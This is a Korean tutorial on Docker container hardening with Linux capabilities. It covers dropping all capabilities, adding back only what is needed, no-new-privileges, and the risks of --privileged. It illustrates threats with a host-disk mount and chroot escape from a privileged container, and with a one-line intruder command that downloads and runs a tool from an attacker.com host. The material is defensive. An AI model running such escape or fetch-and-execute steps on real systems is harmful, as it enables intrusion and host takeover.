---
title: 루트 권한은 하나가 아니다
summary: 수십 개로 쪼개진 권한 조각들, 전부 버리고 필요한 것만 되돌리는 법
versionNote: Linux 6.x · Docker 28 기준
ord: 3
minutes: 23
edges:
  - { to: non-root-container, type: prerequisite }
  - { to: readonly-and-seccomp, type: deepens }
sources:
  - { label: Linux man page - capabilities(7), url: https://man7.org/linux/man-pages/man7/capabilities.7.html }
  - { label: Docker 공식 문서 - Runtime privilege and Linux capabilities, url: https://docs.docker.com/engine/containers/run/ }
  - { label: Docker 공식 문서 - Docker security, url: https://docs.docker.com/engine/security/ }
---

[[non-root-container]] 끝에서 이상한 것을 봤다.

```bash file=terminal
docker run --user 1001 --cap-add NET_BIND_SERVICE nginx
```

**비루트인데 포트 80 을 연다.** 루트가 아니면 못 하는 일인데 된다.

리눅스의 루트 권한이 **하나가 아니라 수십 개의 조각**이기 때문이다.
그리고 이걸 알면 두 가지가 가능해진다.
**비루트에게 조각 하나만 주는 것**, 그리고 **루트에게서 위험한 조각을 빼는 것.**

Docker 는 이미 후자를 하고 있다. 기본값으로 도는 컨테이너의 루트는
**호스트 루트보다 약하다.**

## 0. 들어가기 전에 — 핵심 용어

- **capability**: 루트 권한을 기능 단위로 쪼갠 조각. 40개가 넘는다.
- **`--cap-drop` / `--cap-add`**: 조각을 빼고 더하는 옵션.
- **`--privileged`**: 거의 모든 보호를 **한꺼번에 끄는** 옵션.
- **`no-new-privileges`**: setuid 등으로 권한이 **올라가는 것을 막는** 옵션.
- **setuid 바이너리**: 실행하면 소유자 권한으로 도는 파일. `ping`, `sudo` 등.
- **최소 권한 원칙**: 필요한 만큼만 주는 것.

한 줄 그림: **"루트인가 아닌가"가 아니라 "어떤 조각을 가졌나"가 실제 권한이다.**

비유하자면 **만능 열쇠와 열쇠고리**다.
만능 열쇠 하나를 주면 모든 문이 열린다(옛날의 루트).
열쇠고리에 **문별 열쇠를 따로** 달면, 창고 열쇠만 뽑아 줄 수 있다(capability).
Docker 기본값은 **만능 열쇠에서 위험한 몇 개를 미리 빼둔 고리**를 준다.
`--privileged` 는 **빼둔 것을 다시 꽂고 만능 열쇠까지 얹어 주는 것**이다.

## 1. 그전엔 어떻게 했나 — 루트냐 아니냐로만 생각하기

### 고통 1 — 한 가지가 필요해서 전부를 준다

```
포트 80 을 열어야 한다           → 루트로 돌린다
파일 소유자를 바꿔야 한다        → 루트로 돌린다
시스템 시각을 읽어야 한다        → 루트로 돌린다
```

**필요한 것은 하나인데 전부를 준다.** 그리고 루트가 되면
[[non-root-container]] 의 고통 2, 3 이 전부 따라온다.

"포트 하나 때문에" 침입 후 패키지 설치가 가능해지고,
탈출 시 호스트 루트가 된다. **대가가 지나치게 크다.**

### 고통 2 — `--privileged` 를 복사해 붙인다

안 되는 것이 있으면 이걸 붙이면 거의 다 된다.

```bash file=terminal bad label="예제에서 흔히 보는 옵션"
docker run --privileged myapp
```

Stack Overflow 에서 "Permission denied" 를 검색하면 이 답이 나온다.
**붙이면 된다.** 그래서 붙인다. 그리고 그대로 운영에 간다.

**무엇을 열었는지 모른다.** 그래서 나중에 줄일 수도 없다.
"이거 빼면 안 될 것 같은데" 상태로 영구히 남는다.

### 고통 3 — 기본값이 무엇인지 모른다

```bash file=terminal
$ docker run --rm alpine sh -c 'apk add --no-cache libcap >/dev/null && capsh --print | head -2'
Current: cap_chown,cap_dac_override,cap_fowner,...,cap_setuid,cap_setgid,...
```

**14개쯤이 기본으로 들어 있다.** Docker 가 위험한 것을 빼준 결과다.

그런데 이걸 모르면 두 방향으로 틀린다.
"컨테이너 루트는 호스트 루트와 같다"고 **과대평가**하거나,
"Docker 가 알아서 막아줬다"고 **과소평가**한다.

실제로는 **중간**이다. `SYS_ADMIN` 같은 가장 위험한 것은 빠져 있지만,
남은 것으로도 `/etc/passwd` 수정과 임의 파일 소유자 변경이 **된다.**

### 고통 4 — setuid 로 권한이 다시 올라간다

`USER` 로 비루트로 돌렸는데 안심할 수 없는 경우가 있다.

```bash file=terminal
$ docker run --rm --user 1001 debian:12 find / -perm -4000 2>/dev/null
/usr/bin/mount
/usr/bin/su
/usr/bin/passwd
/usr/bin/chsh
```

**setuid 비트가 붙은 바이너리들**이다. 실행하면 소유자(루트) 권한으로 돈다.
그 바이너리에 취약점이 있으면 **비루트에서 루트로 올라간다.**

`USER` 만으로는 이 경로가 열려 있다.

네 고통의 뿌리는 **하나**다. **권한을 이진으로 봤다.**
실제로는 조각들의 집합이고, 그래서 세밀하게 조절할 수 있다.

## 2. 이렇게 피해봤다

### 시도 1 — 필요한 기능을 포기한다

포트 80 을 포기하고 8080 을 쓴다. 파일 소유자 변경을 안 한다.

**대개 이게 맞는 답**이다. [[non-root-container]] 에서 본
"앱이 높은 포트를 듣게 한다"가 그것이다.

다만 **포기할 수 없는 경우**가 남는다. VPN 클라이언트는 네트워크 설정이 필요하고,
모니터링 에이전트는 다른 프로세스를 봐야 하고,
일부 DB 는 메모리 잠금(`IPC_LOCK`)이 필요하다.

### 시도 2 — `--privileged` 로 열고 나중에 줄인다

"일단 돌게 만들고 나중에 최소화한다"는 계획이다.

**나중이 안 온다.** 돌아가는 것을 건드리는 위험을 아무도 안 진다.
그리고 무엇을 뺄 수 있는지 **알아내는 방법을 모른다.**

### 시도 3 — 호스트에서 돌린다

컨테이너로 권한 문제를 못 풀면 호스트에 설치한다.

**격리를 전부 포기한 것**이다. 그리고 PART 1 의 고통으로 돌아간다.
권한을 쪼갤 수 있다는 것을 알면 안 할 선택이다.

> 세 시도의 공통점: **전부 주거나 전부 포기했다.**
> 조각 단위로 다룰 수 있다는 것을 안 쓰고 있었다.

## 3. 그래서 나온 것 — 전부 버리고 필요한 것만

리눅스 2.2(1999)부터 capability 가 있다. 루트 권한이 조각으로 나뉘어 있다.

```bash file=terminal good label="최소 권한으로 시작한다"
docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE myapp
```

**전부 버리고 하나만 되돌린다.** 이것이 기본 자세다.

자주 쓰이는 조각들이다.

| capability | 하는 일 | 필요한 경우 |
| --- | --- | --- |
| `NET_BIND_SERVICE` | 1024 미만 포트 바인딩 | 80, 443 을 직접 들어야 할 때 |
| `CHOWN` | 파일 소유자 변경 | 엔트리포인트에서 권한 조정 |
| `SETUID` / `SETGID` | 사용자 전환 | `gosu` 로 권한 낮출 때 |
| `DAC_OVERRIDE` | 파일 권한 검사 우회 | 거의 필요 없다 |
| `NET_RAW` | raw 소켓 | `ping`. 공격에도 쓰인다 |
| `SYS_PTRACE` | 다른 프로세스 추적 | 디버거, 프로파일러 |
| `IPC_LOCK` | 메모리 잠금 | 일부 DB 의 성능 설정 |
| `SYS_ADMIN` | **거의 루트** | 주면 안 된다 |

네 고통과 대응시켜 보자.

| 고통 | 해결 |
| --- | --- |
| 하나 때문에 전부를 준다 | `--cap-drop=ALL` 후 **그 하나만** 되돌린다 |
| `--privileged` 를 복사한다 | 무엇이 필요한지 **찾는 방법**이 있다 (아래) |
| 기본값을 모른다 | `capsh --print` 로 본다. 기본은 **14개쯤** |
| setuid 로 올라간다 | **`no-new-privileges`** 로 막는다 |

고통 4 의 해결이 한 줄이다.

```bash file=terminal good label="권한 상승 경로를 닫는다"
docker run --security-opt no-new-privileges:true myapp
```

**setuid 바이너리가 효력을 잃는다.** 거의 모든 애플리케이션에서
부작용이 없고, 쿠버네티스의 `allowPrivilegeEscalation: false` 와 같은 것이다.
**기본으로 켜도 되는 옵션**이다.

## 4. 어떻게 동작하나 — 세 단계의 권한 수준

```visual
id: capabilities-three-levels
kind: structure
title: 같은 루트인데 권한이 세 수준으로 다르다
nodes:
  - name: 컨테이너 안의 uid 0
    detail: 전부 루트라고 불리지만 실제로 할 수 있는 일이 설정에 따라 크게 다르다. 루트인가 아닌가로는 설명이 안 되는 지점이다
    code: 같은 uid 0 · 다른 권한
    children:
      - name: Docker 기본값 — 위험한 것이 빠져 있다
        detail: 아무 옵션 없이 띄운 상태다. 40개 넘는 조각 중 14개쯤만 들어 있다. 호스트 루트보다 명확히 약하다
        code: cap_chown, cap_setuid, cap_net_bind_service 등 14개
        children:
          - name: 되는 일
            detail: 파일 소유자 변경, 권한 검사 우회, 사용자 전환, 1024 미만 포트, 패키지 설치. etc passwd 수정도 된다
            code: 대부분의 파일 조작
          - name: 안 되는 일
            detail: 커널 모듈 적재, 임의 마운트, 시스템 시각 변경, 장치 직접 접근. SYS_ADMIN 과 SYS_MODULE 이 빠져 있다
            code: 커널과 장치 조작
      - name: cap-drop ALL — 조각이 없다
        detail: 권장 기준이다. uid 가 0 이어도 특권 동작을 하나도 못 한다. 웹 애플리케이션 대부분이 이 상태로 잘 돈다
        code: 조각 0개
        children:
          - name: 침입 후 할 수 있는 일
            detail: 패키지 설치가 막히고 시스템 파일을 못 고치고 소유자를 못 바꾼다. non-root-container 의 USER 와 합치면 층이 둘이 된다
            code: 거의 없다
          - name: 필요하면 하나씩 되돌린다
            detail: 실패 로그를 보고 그 동작에 필요한 조각만 cap-add 한다. 무엇이 필요한지가 기록으로 남는다
            code: cap-add 로 명시
      - name: privileged — 전부 되돌리고 더 준다
        detail: 조각 전부에 더해 장치 접근과 seccomp 해제까지 한꺼번에 켠다. 사실상 격리를 포기하는 옵션이다
        code: 모든 조각 + 장치 + seccomp 해제
        children:
          - name: 되는 일
            detail: 호스트 디스크를 직접 마운트할 수 있다. 그것이 곧 탈출 경로다. docker-socket 과 위험 수준이 비슷하다
            code: 호스트 장악 경로 존재
          - name: 정당한 용도
            detail: DinD, 일부 스토리지 드라이버, 하드웨어를 직접 다루는 도구. 그 외에는 더 좁은 옵션으로 대체할 수 있다
            code: 극히 제한적
```

### `--privileged` 가 정확히 무엇을 하나

고통 2 의 답이다. 한 옵션이 **세 가지를 동시에** 한다.

```
1. 모든 capability 를 준다              (SYS_ADMIN, SYS_MODULE 포함)
2. /dev 의 모든 장치에 접근을 허용한다   (호스트 디스크 포함)
3. seccomp 와 AppArmor 프로파일을 해제한다
```

그래서 이런 것이 가능해진다.

```bash file=terminal bad label="privileged 컨테이너 안에서"
# fdisk -l
/dev/sda    512GB        ← 호스트 디스크가 보인다
# mkdir /h && mount /dev/sda1 /h
# chroot /h sh           ← 호스트 파일 시스템
```

**[[docker-socket]] 과 같은 결과**에 도달한다.
그래서 둘을 같은 수준의 위험으로 다뤄야 한다.

### 무엇이 필요한지 찾는 법

고통 2 의 "나중에 줄인다"를 실제로 할 수 있는 방법이다.

```bash file=terminal
# 1. 전부 버리고 띄워본다
$ docker run --cap-drop=ALL myapp
Error: bind: permission denied

# 2. 실패를 보고 하나 되돌린다
$ docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE myapp
# 돈다

# 3. 어떤 조각을 가졌는지 확인한다
$ docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE \
    myapp sh -c 'capsh --print | head -1'
Current: cap_net_bind_service=ep
```

**실패 메시지가 단서를 준다.** `bind: permission denied` 는 `NET_BIND_SERVICE`,
`chown: Operation not permitted` 는 `CHOWN`,
`ptrace: Operation not permitted` 는 `SYS_PTRACE` 다.

그리고 더 정확하게 보려면 시스템 콜을 추적한다.

```bash file=terminal
$ docker run --rm --cap-add SYS_PTRACE myapp strace -f -e trace=all ./app 2>&1 \
  | grep EPERM
```

**`EPERM` 이 나온 호출**이 권한이 부족한 지점이다.

순서를 정리하면 "나중에 줄인다"가 실제로 가능해진다.

```visual
id: capabilities-narrowing-process
kind: step
title: privileged 에서 최소 권한까지 좁혀가는 순서
steps:
  - name: 출발 — privileged 로 돌고 있다
    detail: 무엇이 필요한지 모르는 상태다. 돌아가니까 건드리기 무섭고, 그래서 영구히 남는다. 여기서 시작하는 것이 현실이다
    code: --privileged
  - name: 1. 전부 버리고 띄워본다
    detail: cap-drop ALL 로 바꾸고 실행한다. 깨지는 것이 목표다. 어디서 깨지는지가 정보다
    code: --cap-drop=ALL
  - name: 2. 실패 메시지를 읽는다
    detail: bind permission denied 면 NET_BIND_SERVICE, chown Operation not permitted 면 CHOWN 이다. 메시지가 조각 이름을 거의 알려준다
    code: 메시지 → 조각 이름
  - name: 3. 하나만 되돌려 다시 띄운다
    detail: 한 번에 여러 개를 넣지 않는다. 하나씩 넣으면 무엇이 실제로 필요한지가 확정된다
    code: --cap-drop=ALL --cap-add=NET_BIND_SERVICE
  - name: 4. 메시지가 모호하면 시스템 콜을 본다
    detail: strace 로 EPERM 이 난 호출을 찾는다. 그 호출에 필요한 조각을 man capabilities 에서 역추적한다
    code: strace | grep EPERM
  - name: 5. 장치가 필요한지 따로 본다
    detail: privileged 는 조각과 장치 접근을 같이 줬다. 장치가 필요했던 것이면 --device 로 그 장치만 준다
    code: --device /dev/net/tun
  - name: 6. no-new-privileges 를 더한다
    detail: setuid 경로를 닫는다. 부작용이 거의 없으므로 이 단계에서 같이 넣는다
    code: --security-opt no-new-privileges:true
  - name: 7. 남은 조각을 주석으로 남긴다
    detail: 왜 그 조각이 필요한지 적어둔다. 이것이 없으면 다음 사람이 다시 privileged 로 되돌린다
    code: 이유를 기록한다
```

### 어떻게 설정할까

```visual
id: capabilities-which-caps
kind: playground
title: 이 애플리케이션에는 무엇이 필요한가
inputs:
  - { name: 앱, label: 어떤 앱, options: [일반 웹 애플리케이션, 포트 80 을 직접 듣는 nginx, 엔트리포인트에서 chown 하는 DB, ping 을 쓰는 모니터링, 프로파일러를 붙여야 하는 JVM, VPN 클라이언트] }
outcomes:
  - when: { 앱: 일반 웹 애플리케이션 }
    result: cap-drop ALL 로 충분하다. 되돌릴 것이 없다
    note: 대부분의 Node, Python, Java 웹 앱이 여기 해당한다. 안 될 이유가 없으니 기본으로 적용한다
  - when: { 앱: 포트 80 을 직접 듣는 nginx }
    result: NET_BIND_SERVICE 하나만 되돌린다. 또는 8080 을 듣게 하고 포트 매핑으로 흡수한다
    note: 후자가 더 깔끔하다. 컨테이너 안의 포트 번호는 호스트와 독립이라 아무 번호여도 된다
  - when: { 앱: 엔트리포인트에서 chown 하는 DB }
    result: CHOWN, SETUID, SETGID 가 필요하다. 공식 postgres 이미지가 이 조합을 쓴다
    note: 볼륨을 쓰면 애초에 권한이 맞으므로 chown 이 불필요해지는 경우도 있다. volume-vs-bind 에서 본 그 이득이다
  - when: { 앱: ping 을 쓰는 모니터링 }
    result: NET_RAW 가 필요하다. 다만 공격에도 쓰이는 조각이라 정말 ping 이어야 하는지 본다
    note: TCP 연결 확인으로 대체할 수 있으면 그쪽이 낫다. NET_RAW 는 패킷 위조에도 쓰인다
  - when: { 앱: 프로파일러를 붙여야 하는 JVM }
    result: SYS_PTRACE 가 필요하다. 운영에서는 평소에 빼두고 조사할 때만 넣는 쪽을 검토한다
    note: 또는 namespaces 에서 본 것처럼 --pid container 로 도구 컨테이너를 붙인다. 운영 컨테이너를 안 건드리는 쪽이 낫다
  - when: { 앱: VPN 클라이언트 }
    result: NET_ADMIN 과 장치 접근이 필요하다. privileged 로 가지 말고 필요한 것만 명시한다
    note: cap-add NET_ADMIN 과 device /dev/net/tun 두 개로 대개 된다. privileged 가 유일한 방법이 아니다
```

### 기본으로 걸어둘 조합

```yaml file=compose.yaml good label="대부분의 앱에 적용 가능한 기본값"
services:
  app:
    image: myapp:1.0
    user: "1001:1001"
    cap_drop: [ALL]
    security_opt:
      - no-new-privileges:true
    read_only: true
    tmpfs:
      - /tmp
```

**네 줄로 층이 넷**이 된다.
비루트([[non-root-container]]), 조각 없음, 권한 상승 차단,
그리고 읽기 전용은 다음 글의 주제다.

## 5. 이것도 끝이 아니다 — 쓸 수 있는 것과 부를 수 있는 것

권한 조각을 최소화했다. 그런데 두 가지가 남았다.

**첫째, 침입자가 도구를 내려받아 설치할 수 있다.**
`cap-drop=ALL` 로 패키지 매니저는 막혔지만,
쓰기 가능한 경로에 바이너리를 내려받아 실행하는 것은 된다.

```bash file=terminal
# curl -o /tmp/tool https://attacker.com/tool && chmod +x /tmp/tool && /tmp/tool
```

**둘째, capability 가 막지 못하는 층이 있다.**
컨테이너 안의 프로세스는 **커널에 시스템 콜을 직접 날린다.**
커널 취약점은 대개 특정 시스템 콜을 통해 터지는데,
capability 로는 그 호출 자체를 막을 수 없다.

쓸 수 있는 자리를 없애는 것과, 부를 수 있는 시스템 콜을 줄이는 것.
[[readonly-and-seccomp]] 에서 둘을 본다.

## 자기 점검

- "루트 권한"을 쪼갠다는 발상이 왜 보안에 유리한가?
- `--privileged` 가 위험한 이유를 세 가지 작용으로 설명하면?
- Docker 기본값으로 도는 컨테이너 루트가 호스트 루트와 다른 점은?
- `no-new-privileges` 가 막는 경로는? 부작용이 거의 없는 이유는?
- 어떤 capability 가 필요한지 찾는 순서는?

## 덧 — 흔한 오해

### "비루트로 돌리면 capability 는 신경 쓸 필요 없다"

**비루트도 capability 를 가질 수 있다.** 그래서 둘은 별개의 축이다.

```
--user 1001                          → uid 가 1001. 조각은 기본값이 거의 안 붙는다
--user 1001 --cap-add NET_BIND_SERVICE → 비루트인데 특권 포트를 연다
--cap-drop=ALL (루트)                 → 루트인데 특권 동작을 못 한다
```

실제로는 비루트로 띄우면 **대부분의 조각이 효력을 잃는다.**
파일 capability 가 없으면 프로세스가 그것을 쓸 수 없기 때문이다.

그래도 `--cap-drop=ALL` 을 같이 적는 이유는
**의도를 명시**하고, 혹시 누가 `--user` 를 빼더라도
**방어선이 하나 남게** 하는 것이다. 층을 쌓는다는 뜻이다.

### "`--cap-add` 는 기본값에 더하는 것이다"

**맞다. 그래서 `--cap-drop=ALL` 과 같이 써야 한다.**

```bash file=terminal bad label="기본 14개에 하나를 더한 것"
docker run --cap-add SYS_PTRACE myapp

docker run --cap-drop=ALL --cap-add SYS_PTRACE myapp   # 조각이 하나뿐
```

위쪽은 **15개를 가진 상태**다. "하나만 줬다"고 착각하기 쉽다.

```bash file=terminal
$ docker run --rm --cap-add SYS_PTRACE alpine \
    sh -c 'apk add -q libcap && capsh --print | head -1 | tr , "\n" | wc -l'
15
```

**`--cap-drop=ALL` 을 먼저 쓰는 습관**이 중요하다.
순서는 상관없고 둘 다 있어야 한다.

### "`--privileged` 가 필요한 경우는 없다"

**있다.** 다만 생각보다 훨씬 드물다.

```
정당한 경우 : DinD, 일부 스토리지·네트워크 드라이버,
             하드웨어를 직접 다루는 도구, 커널 모듈을 다루는 것
흔한 오용   : Permission denied 를 빨리 없애려고
```

그리고 정당한 경우에도 **더 좁은 옵션으로 대체 가능한지** 먼저 본다.

```bash file=terminal
--device /dev/net/tun --cap-add NET_ADMIN      # VPN. privileged 불필요
--device /dev/kvm                               # 가상화. privileged 불필요
--cap-add SYS_ADMIN --security-opt apparmor=unconfined   # 마운트가 필요하면 이 정도까지
```

`--device` 와 `--cap-add` 의 조합으로 **대부분 대체된다.**
`--privileged` 를 쓰는 컨테이너는 **그 코드를 완전히 신뢰할 수 있어야** 하고,
무엇을 위해 필요한지 **주석으로 남겨야** 한다.
